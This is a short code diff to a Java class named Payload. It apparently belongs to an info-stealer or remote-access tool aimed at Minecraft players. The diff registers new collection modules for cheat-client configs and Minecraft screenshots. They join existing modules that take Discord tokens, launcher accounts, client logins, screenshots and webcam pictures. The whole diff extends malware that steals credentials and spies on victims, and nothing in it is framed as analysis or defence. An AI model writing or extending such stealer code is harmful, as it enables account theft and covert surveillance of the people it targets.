@@ -21,8 +21,11 @@ public final class Payload {
                 new Info(),
                 new ScreenShot(),
                 new ModsFolder(),
+                new FdpConfigs(),
                 new UsefulFiles(),
+                new RiseConfigs(),
                 new NixwareLogin(),
+                new MCScreenshots(),
                 new PlagueConfigs(),
                 new WebcamPicture(),
                 new DiscordTokens(),
@@ -30,7 +33,9 @@ public final class Payload {
                 new NixwareConfigs(),
                 new JarsFromDesktop(),
                 new ChangeWallpaper(),
+                new EarthhackConfigs(),
                 new LegendwareScripts(),
+                new RusherhackConfigs(),
                 new MCLauncherAccounts()
         ));
     }
